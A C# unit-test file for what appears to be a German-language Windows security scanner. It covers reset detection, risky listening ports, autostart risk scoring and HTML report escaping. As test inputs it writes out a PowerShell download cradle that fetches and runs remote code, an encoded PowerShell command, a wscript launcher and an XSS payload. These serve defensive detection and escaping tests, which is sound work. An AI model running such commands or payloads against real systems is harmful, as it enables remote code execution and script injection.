using Sentinel.Core.Checks;
using Sentinel.Core.Integrity;
using Sentinel.Core.Reporting;
using Sentinel.Core.Scoring;
using Sentinel.Core.System;
using Xunit;

namespace Sentinel.Tests;

public class ResetDetectorTests
{
    [Fact]
    public void FreshInstall_NoMarker_NoUsers()
    {
        string dir = Path.Combine(Path.GetTempPath(), "sntest_" + Guid.NewGuid().ToString("N"));
        try
        {
            var detector = new ResetDetector(dir);
            var result = detector.Check(hasUserData: false);

            Assert.True(result.IsFreshInstall);
            Assert.False(result.WasReset);
        }
        finally { try { Directory.Delete(dir, true); } catch { } }
    }

    [Fact]
    public void Reset_MarkerExists_NoUsers()
    {
        string dir = Path.Combine(Path.GetTempPath(), "sntest_" + Guid.NewGuid().ToString("N"));
        try
        {
            var detector = new ResetDetector(dir);
            detector.MarkInstalled(); // simuliert: war mal eingerichtet

            var result = detector.Check(hasUserData: false);

            Assert.False(result.IsFreshInstall);
            Assert.True(result.WasReset);
            Assert.Contains("Reset", result.Message);
        }
        finally { try { Directory.Delete(dir, true); } catch { } }
    }

    [Fact]
    public void NormalStart_UsersPresent()
    {
        string dir = Path.Combine(Path.GetTempPath(), "sntest_" + Guid.NewGuid().ToString("N"));
        try
        {
            var detector = new ResetDetector(dir);
            var result = detector.Check(hasUserData: true);

            Assert.False(result.IsFreshInstall);
            Assert.False(result.WasReset);
            Assert.Contains("Normaler Start", result.Message);

            // Marker muss jetzt gesetzt sein
            Assert.True(File.Exists(Path.Combine(dir, ResetDetector.MarkerFileName)));
        }
        finally { try { Directory.Delete(dir, true); } catch { } }
    }

    [Fact]
    public void RemoveMarker_CleansFile()
    {
        string dir = Path.Combine(Path.GetTempPath(), "sntest_" + Guid.NewGuid().ToString("N"));
        try
        {
            var detector = new ResetDetector(dir);
            detector.MarkInstalled();
            detector.RemoveMarker();

            Assert.False(File.Exists(Path.Combine(dir, ResetDetector.MarkerFileName)));
        }
        finally { try { Directory.Delete(dir, true); } catch { } }
    }
}

public class ListeningPortsAnalyzerTests
{
    [Fact]
    public void RiskyPort_Detected()
    {
        var result = ListeningPortsAnalyzer.AnalyzeRisky("3389|Listen|1234");
        Assert.Single(result);
        Assert.Equal(3389, result[0].Port);
    }

    [Fact]
    public void SafePort_Ignored()
    {
        var result = ListeningPortsAnalyzer.AnalyzeRisky("8080|Listen|1234");
        Assert.Empty(result);
    }

    [Fact]
    public void NonListenState_Ignored()
    {
        var result = ListeningPortsAnalyzer.AnalyzeRisky("3389|Established|1234");
        Assert.Empty(result);
    }

    [Fact]
    public void MultiplePorts_AllFound()
    {
        var result = ListeningPortsAnalyzer.AnalyzeRisky("3389|Listen|1\n445|Listen|2\n8080|Listen|3\n23|Listen|4");
        Assert.Equal(3, result.Count); // 3389, 445, 23
    }
}

public class AutostartRiskAnalyzerTests
{
    [Fact]
    public void NormalApp_NoRisk()
    {
        var result = AutostartRiskAnalyzer.Analyze("Spotify", "C:\\Program Files\\Spotify\\spotify.exe");
        Assert.Equal(0, result.RiskScore);
        Assert.Equal("unauffällig", result.RiskReason);
    }

    [Fact]
    public void TempStart_HighRisk()
    {
        var result = AutostartRiskAnalyzer.Analyze("Sketchy", "C:\\Users\\X\\AppData\\Local\\Temp\\evil.exe");
        Assert.True(result.RiskScore >= 8);
        Assert.Contains("TEMP", result.RiskReason);
    }

    [Fact]
    public void Base64_VeryHighRisk()
    {
        var result = AutostartRiskAnalyzer.Analyze("Encoded", "powershell -EncodedCommand SQBFAFgA");
        Assert.True(result.RiskScore >= 9);
        Assert.Contains("verschleiert", result.RiskReason);
    }

    [Fact]
    public void DownloadCradle_Flagged()
    {
        var result = AutostartRiskAnalyzer.Analyze("Fetcher", "powershell IEX(New-Object Net.WebClient).DownloadString('http://x.com/a')");
        Assert.True(result.RiskScore >= AutostartRiskAnalyzer.SuspicionThreshold);
        Assert.Contains("Netz", result.RiskReason);
    }

    [Fact]
    public void ScriptHost_Flagged()
    {
        var result = AutostartRiskAnalyzer.Analyze("VBS", "wscript C:\\Users\\X\\appdata\\local\\run.vbs");
        Assert.True(result.RiskScore >= AutostartRiskAnalyzer.SuspicionThreshold);
    }
}

public class HtmlReportExporterTests
{
    [Fact]
    public void Render_ContainsScoreAndChecks()
    {
        var report = new ScanReport
        {
            FinishedAt = new DateTimeOffset(2026, 1, 15, 10, 0, 0, TimeSpan.Zero),
            Score = new SecurityScore
            {
                Value = 72, Grade = ScoreGrade.Gut,
                Passed = 1, Warnings = 1, Graded = 2,
                Contributions = Array.Empty<ScoreContribution>(),
                EarnedPoints = 36, MaxPoints = 50
            },
            Results = new[]
            {
                new CheckResult
                {
                    Id = "test.one", Title = "Test", Status = CheckStatus.Pass,
                    Detail = "Alles ok.", Weight = CheckWeight.Normal,
                    Explanation = "Warum das wichtig ist.", Source = "Unit"
                }
            }
        };

        string html = HtmlReportExporter.Render(report);

        Assert.Contains("SENTINEL", html);
        Assert.Contains("72", html);
        Assert.Contains("Felix Greis", html);
        Assert.Contains("Elian", html);
        Assert.Contains("Alles ok.", html);
        Assert.Contains("Test", html);
        Assert.DoesNotContain("<script>", html);
    }

    [Fact]
    public void Render_EscapesHtml()
    {
        var report = new ScanReport
        {
            FinishedAt = DateTimeOffset.UtcNow,
            Score = new SecurityScore
            {
                Value = 50, Grade = ScoreGrade.Verbesserungsbedarf,
                Warnings = 1, Graded = 1,
                Contributions = Array.Empty<ScoreContribution>(),
                EarnedPoints = 25, MaxPoints = 50
            },
            Results = new[]
            {
                new CheckResult
                {
                    Id = "xss.test", Title = "XSS", Status = CheckStatus.Warning,
                    Detail = "<img src=x onerror=alert(1)>", Weight = CheckWeight.Normal,
                    Explanation = "Test", Source = "Unit"
                }
            }
        };

        string html = HtmlReportExporter.Render(report);

        // Muss escaped sein
        Assert.DoesNotContain("<img src=x", html);
        Assert.Contains("&lt;img", html);
    }
}
